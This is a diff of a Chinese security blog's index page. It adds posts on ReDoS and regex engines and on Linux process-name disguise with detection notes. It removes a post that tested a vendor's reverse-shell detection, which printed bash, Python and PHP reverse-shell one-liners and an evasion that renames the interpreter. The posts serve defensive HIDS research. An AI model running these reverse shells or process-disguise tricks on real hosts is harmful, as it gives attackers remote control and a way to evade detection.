@@ -168,7 +168,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8E%9F%E7%90%86%E4%B8%8EReDos%E6%94%BB%E5%87%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -181,7 +181,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/" class="post-title-link" itemprop="url">用strace定位bug</a>
+          <a href="/2021-12-26-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8E%9F%E7%90%86%E4%B8%8EReDos%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">正则表达式原理与ReDos攻击</a>
         </h2>
 
         <div class="post-meta-container">
@@ -205,36 +205,53 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今年年初(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzMzI3OTczNA==&scene=124#wechat_redirect">2021年我的学习计划</a>)我就计划补一下”操作系统”这门计算机专业课.</p>
-<p>最近我就在学一门网课，是极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>，感觉还可以：代码量是1w行多点，课程我就把它当做一个45讲的代码说明文档。</p>
-<p>网上也有一些类似的”实验教学”，比如：</p>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在研究 <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">ReDos攻击</a> 时，涉及到两个问题</p>
+<ol>
+<li>实现正则表达式的算法，比如NFA和DFA是什么？</li>
+<li>我们用的编程语言如Python、PHP等的正则功能是怎么实现的？</li>
+</ol>
+<h1 id="研究过程"><a href="#研究过程" class="headerlink" title="研究过程"></a>研究过程</h1><h2 id="正则表达式算法"><a href="#正则表达式算法" class="headerlink" title="正则表达式算法"></a>正则表达式算法</h2><p>关于NFA和DFA的讲解和实现，推荐读者看  <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/137286?utm_term=zeusULN89&utm_source=app&utm_medium=geektime&utm_campaign=314-presell&utm_content=diyijijiacan0601">16 | NFA和DFA：如何自己实现一个正则表达式工具？</a> 这篇文章，讲得深入浅出，并配有Java代码demo。</p>
+<p>我用Python实现了课程的内容，代码在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithCompiler/blob/master/algorithm/regex.py">regex</a>。</p>
+<p>这一部分我想说的是：</p>
+<p>在研究ReDos攻击时，我们只要知道”NFA算法中回溯可能会造成计算量暴增，从而导致ReDos”这个结论就可以。</p>
+<p>不过知道一些算法原理，我感觉可以在我们验证语言是采用哪种算法时心里更有底一些。想要自动化检测可能产生ReDos的正则时，对正则原理也需要知道。</p>
+<h2 id="编程语言的正则是怎么实现的？"><a href="#编程语言的正则是怎么实现的？" class="headerlink" title="编程语言的正则是怎么实现的？"></a>编程语言的正则是怎么实现的？</h2><p>我测试了下面几个语言的正则，我自己把他们划分成两类：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/chyyuu/os_kernel_lab">kernel实验</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/sunym1993/flash-linux0.11-talk">linux0.11内核解读</a></li>
-<li><a target="_blank" rel="noopener" href="https://reactos.org/">reactos-操作系统</a></li>
+<li>第一类<ul>
+<li>C  (pcre库)</li>
+<li>Lua</li>
+<li>Nginx (ngx.re模块)</li>
+<li>PHP</li>
 </ul>
-<p>目前我学习<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos">操作系统实战</a>有两个学习目标：</p>
-<ul>
-<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson13/Cosmos">第十三课的代码</a>：十三课之前的内容包括了整个机器初始化过程</li>
-<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第二十六课的代码</a>：比”十三课”内容多了”进程”和”内存”</li>
+</li>
+<li>第二类<ul>
+<li>Python</li>
 </ul>
-<p>本文记录我在学习时遇到的第一个小问题：编译”第十三课的代码”时遇到一个报错</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/141682853-e5976402-09ba-4478-aae6-4406e44c7dc3.png" alt="image"></p>
-<p>问题解决思路：</p>
-<ul>
-<li>搞清楚”编译器”去哪里找”kernel.inc”文件</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>最简便的方法找到”kernel.inc”文件位置</p>
-<p>strace -f可以跟踪子进程的系统调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp Cosmos]# strace -f make 2&gt;&#x2F;tmp&#x2F;q.txt</span><br><span class="line">[root@instance-fj5pftdp Cosmos]# cat &#x2F;tmp&#x2F;q.txt</span><br><span class="line">...</span><br><span class="line">[pid 20451] open(&quot;kernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;includekernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;bastypeinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;halinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;knlinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;libinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;drvinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] write(2, &quot;..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: &quot;, 25..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: ) &#x3D; 25</span><br></pre></td></tr></table></figure>
-
-<p>可以发现 <code>../includekernel.inc</code>等路径少了一个<code>/</code>符号</p>
-<p>修改后，就编译成功了</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/141683341-8053e5e0-850c-437f-9105-94ae1a4809fe.png" alt="image"></p>
 </li>
 </ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>strace -f</code> 真香：不需要我去研究”代码”或者”编译器”是怎么包含”kernel.inc文件”。</p>
+<p>测试代码我放在了 <a target="_blank" rel="noopener" href="https://github.com/leveryd/regex_test">regex_test</a></p>
+<p>我划分这两类仅仅依据”是否依赖PCRE库”</p>
+<h3 id="第一类"><a href="#第一类" class="headerlink" title="第一类"></a>第一类</h3><p>先说结论：依赖PCRE实现的正则只要配置好最大回溯次数的，就没有ReDos问题。</p>
+<p>我把”基于PCRE库实现的正则功能”的算到了第一类中，<code>PCRE</code>的详细介绍可以查看man手册。</p>
+<p>PCRE库是有两套API接口的。执行<code>man pcrematching</code>命令可以在man帮助手册查看到算法相关的描述。</p>
+<p>一套是基于NFA算法，调用pcre_exec等函数来做正则匹配；另一套是基于DFA算法，调用pcre_dfa_exec等函数来做正则匹配。</p>
+<p>默认用的都是NFA算法，但是PCRE库提供配置选项，可以控制最大回溯次数，超过了回溯次数后就不匹配了。</p>
+<p>其他语言也同样有配置选项来控制最大回溯次数，比如</p>
+<pre><code>PHP的pcre扩展中, 提供了俩个设置项
+
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pcre.backtrack_limit &#x2F;&#x2F;最大回溯数</span><br><span class="line">pcre.recursion_limit &#x2F;&#x2F;最大嵌套数</span><br></pre></td></tr></table></figure>
+
+Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
+<h3 id="第二类"><a href="#第二类" class="headerlink" title="第二类"></a>第二类</h3><p>先说结论：这一类语言如果没有”最大回溯次数的配置”选项，很容易出现ReDos问题。</p>
+<p>我把”自己实现正则算法”的归在了第二类。</p>
+<p>这里我只看了Python语言的re模块。</p>
+<p>CPython的re模块在c层面相关的文件有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Modules&#x2F;_sre.c</span><br><span class="line">Modules&#x2F;sre_lib.h</span><br></pre></td></tr></table></figure>
+<p>具体的代码逻辑也没有细看，根据测试结果来看re模块也应该是NFA算法，且源码中没有看到调用PCRE的api所以应该不是基于PCRE实现的。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过写一个小的正则解析器demo可以理解DFA和NFA的原理和区别，NFA转换成DFA后状态机就不存在回溯了，所以DFA算法没有ReDos问题。</p>
+<p>基于PCRE实现的正则基本都有配置选项限制回溯次数，所以出现ReDos的概率会小很多。</p>
+<p>像CPython re模块这种自己实现NFA算法的，又没有控制回溯次数的，就很有可能出现ReDos问题。比如<a target="_blank" rel="noopener" href="https://bugs.python.org/issue39503">CVE-2020-8492</a>、<a target="_blank" rel="noopener" href="https://github.com/python/cpython/commit/0902a2d6b2d1d9dbde36aeaaccf1788ceaa97143">CVE-2018-1060/CVE-2018-1061</a></p>
+<p>为了自动化检测ReDos问题，我们可以基于如<a target="_blank" rel="noopener" href="https://github.com/superhuman/rxxr2">rxxr2</a>类似的工具开发。这些工具有没有一些漏报的情况，就需要另外研究了。</p>
 
       
     </div>
@@ -355,6 +372,99 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/" class="post-title-link" itemprop="url">用strace定位bug</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今年年初(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzMzI3OTczNA==&scene=124#wechat_redirect">2021年我的学习计划</a>)我就计划补一下”操作系统”这门计算机专业课.</p>
+<p>最近我就在学一门网课，是极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>，感觉还可以：代码量是1w行多点，课程我就把它当做一个45讲的代码说明文档。</p>
+<p>网上也有一些类似的”实验教学”，比如：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/chyyuu/os_kernel_lab">kernel实验</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sunym1993/flash-linux0.11-talk">linux0.11内核解读</a></li>
+<li><a target="_blank" rel="noopener" href="https://reactos.org/">reactos-操作系统</a></li>
+</ul>
+<p>目前我学习<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos">操作系统实战</a>有两个学习目标：</p>
+<ul>
+<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson13/Cosmos">第十三课的代码</a>：十三课之前的内容包括了整个机器初始化过程</li>
+<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第二十六课的代码</a>：比”十三课”内容多了”进程”和”内存”</li>
+</ul>
+<p>本文记录我在学习时遇到的第一个小问题：编译”第十三课的代码”时遇到一个报错</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/141682853-e5976402-09ba-4478-aae6-4406e44c7dc3.png" alt="image"></p>
+<p>问题解决思路：</p>
+<ul>
+<li>搞清楚”编译器”去哪里找”kernel.inc”文件</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>最简便的方法找到”kernel.inc”文件位置</p>
+<p>strace -f可以跟踪子进程的系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp Cosmos]# strace -f make 2&gt;&#x2F;tmp&#x2F;q.txt</span><br><span class="line">[root@instance-fj5pftdp Cosmos]# cat &#x2F;tmp&#x2F;q.txt</span><br><span class="line">...</span><br><span class="line">[pid 20451] open(&quot;kernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;includekernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;bastypeinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;halinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;knlinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;libinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;drvinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] write(2, &quot;..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: &quot;, 25..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: ) &#x3D; 25</span><br></pre></td></tr></table></figure>
+
+<p>可以发现 <code>../includekernel.inc</code>等路径少了一个<code>/</code>符号</p>
+<p>修改后，就编译成功了</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/141683341-8053e5e0-850c-437f-9105-94ae1a4809fe.png" alt="image"></p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>strace -f</code> 真香：不需要我去研究”代码”或者”编译器”是怎么包含”kernel.inc文件”。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -442,7 +552,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -455,7 +565,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">某厂商的反弹shell防护能力测试</a>
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/" class="post-title-link" itemprop="url">如何改变进程名称</a>
         </h2>
 
         <div class="post-meta-container">
@@ -479,48 +589,235 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>工作任务需要测试某厂商的反弹shell检测安全能力</p>
-<p>测试思路：</p>
-<ol>
-<li>挑选测试样本<ul>
-<li>每一种检测策略挑选对应的1-3个样本</li>
-</ul>
-</li>
-<li>测试过程中<ul>
-<li>如果某一类样本中的任意一个样本未通过测试，就不继续测试同类其他样本</li>
-<li>如果某一类样本完全被拦截，就尝试绕过</li>
-</ul>
-</li>
-</ol>
-<p>测试时需要注意下面的点，可能会影响测试结果</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pFpGujKnXMhOh5ef3Z9H2g">测试反弹shell</a>时，测试发现：某厂商会根判断程命令是否是bash、sh等脚本解释器，如果修改bash、sh等文件名后反弹shell，就会绕过厂商的反弹shell防护。</p>
+<blockquote>
+<p>需要注意的的是：”修改敏感文件名、复制敏感文件“本身非常有可能被hids当作一种”异常文件操作”行为。</p>
+</blockquote>
+<p>还有一些场景下也会涉及到”进程名称的修改”：比如某些恶意软件会修改进程名称，伪装成”内核线程”。</p>
+<p>所以可以说，在”进程名称的修改”这个点上是存在一些攻防对抗的。</p>
+<p>本文研究：</p>
 <ul>
-<li>反弹shell后，是否输入命令</li>
+<li>除了直接修改程序文件名，还有哪些方式来修改进程名称？</li>
+<li>作为防守方，怎么发现和检测这些”修改方式”？</li>
 </ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="挑选测试样本"><a href="#挑选测试样本" class="headerlink" title="挑选测试样本"></a>挑选测试样本</h2><p>按照<code>安全项目/HIDS/业务：入侵检测/反弹shell/3.反弹shell检测.md</code>学习的检测策略，每一种检测策略挑选对应的1-3个样本。</p>
-<ol>
-<li><p>bash进程、默认文件描述符指向socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>本文应该适合 做应急响应、hids和”对linux后渗透感兴趣”的读者阅读，文章中给出了我对每种隐藏方式的效果验证，方便读者对隐藏效果做评估。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么查看”进程名称”？</p>
+<p>在 /proc/{pid} 目录下有好几个文件都存放有”进程名称”相关的信息，如下图：<br><img src="https://user-images.githubusercontent.com/1846319/131244474-9dbb39c7-ba13-4033-a213-809a7773e443.png" alt="image"></p>
+<p>更常见的情况下，我们是通过ps、top等命令来查看进程信息。</p>
+<p>ps命令也是基于 /proc/{pid}/stat、/proc/{pid}/status、/proc/{pid}/cmdline 等文件来获取进程信息。可以通过strace命令查看系统调用验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# strace ps aux 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;cmdline&quot;, O_RDONLY)   &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br><span class="line">[root@instance-fj5pftdp ~]# strace ps -A 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>没有bash进程、默认文件描述符不指向socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;127.0.0.1&#39;,2222))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE,shell&#x3D;True);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+<li><p>怎么修改”进程名称”？</p>
+<p>改变进程名包括以下方式：</p>
+<ul>
+<li>execve系统调用</li>
+<li>prctl系统调用</li>
+<li>修改进程argv</li>
+<li>软链接</li>
+</ul>
 </li>
-<li><p>对抗行为（使用其他sh解释器）</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>对抗行为（修改sh解释器名称）</p>
-<p>   修改bash、sh</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;x; x -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1      &#x2F;&#x2F; x是bash</span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;sh &#x2F;usr&#x2F;bin&#x2F;y; 0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;4242; y &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196  &#x2F;&#x2F; y是sh</span><br></pre></td></tr></table></figure>
+</ul>
+<h1 id="通过”execve系统调用”改变进程名称"><a href="#通过”execve系统调用”改变进程名称" class="headerlink" title="通过”execve系统调用”改变进程名称"></a>通过”execve系统调用”改变进程名称</h1><ul>
+<li><p>怎么通过”execve系统调用”可以改变进程名称？</p>
+<p>execve系统调用的第二个参数可以指定cmdline，如下：</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131255950-11235b12-c64c-4572-8a0d-521a299b3ee6.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     char * execve_str[] &#x3D; &#123;&quot;test_sleep&quot;,&quot;10000&quot;&#125;;   &#x2F;&#x2F; 第一个参数会出现在&#x2F;pro&#x2F;&#123;pid&#125;&#x2F;cmdline</span><br><span class="line">     char * env[] &#x3D; &#123;NULL&#125;;</span><br><span class="line">     if (execve(&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;,execve_str,env) &lt;0 )&#123;</span><br><span class="line">         perror(&quot;error on exec&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>更简便的方式是：通过bash的exec命令的<code>-a</code>参数改变进程名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec -a &quot;xxx&quot; sleep 10000</span><br></pre></td></tr></table></figure>
 </li>
-</ol>
-<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>1 通过</p>
-<p>2、3、4 不通过</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  4类样本中，仅检测出1类最基础的反弹shell。</p>
-<p>  在测试过程中发现：</p>
-<ul>
-<li>检测到反弹shell后不会立马告警：厂商会检测shell是否执行命令，如果仅仅反弹shell但是没有执行命令就不会被拦截</li>
+<li><p>效果</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131254028-441d0792-68b5-4eab-b2a2-6208fe6f2c70.png" alt="image"></p>
+<p>可以看到：<code>ps -A</code>可以看到sleep文件名信息，<code>ps aux</code>无法看到。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131253952-c2ea6b18-614f-4145-b7a5-c05b97235a29.png" alt="image"></p>
+<p>可以看到：只有cmdline被修改了。</p>
+</li>
 </ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263684.html">云上威胁检测 | 详解反弹shell多维检测技术</a></p>
+<h1 id="通过”prctl系统调用”改变进程名称"><a href="#通过”prctl系统调用”改变进程名称" class="headerlink" title="通过”prctl系统调用”改变进程名称"></a>通过”prctl系统调用”改变进程名称</h1><ul>
+<li><p>怎么通过”prctl系统调用”改变进程名称？</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
+</li>
+<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256636-e9edd238-3856-4f90-a126-30570e44a472.png" alt="image"></p>
+<p>可以看到虽然stat、comm、status文件已经修改，但是cmdline、exe等文件仍然有原程序名信息。</p>
+</li>
+<li><p>怎么检测？</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md">字节hids</a> hook了这个系统调用</p>
+</li>
+</ul>
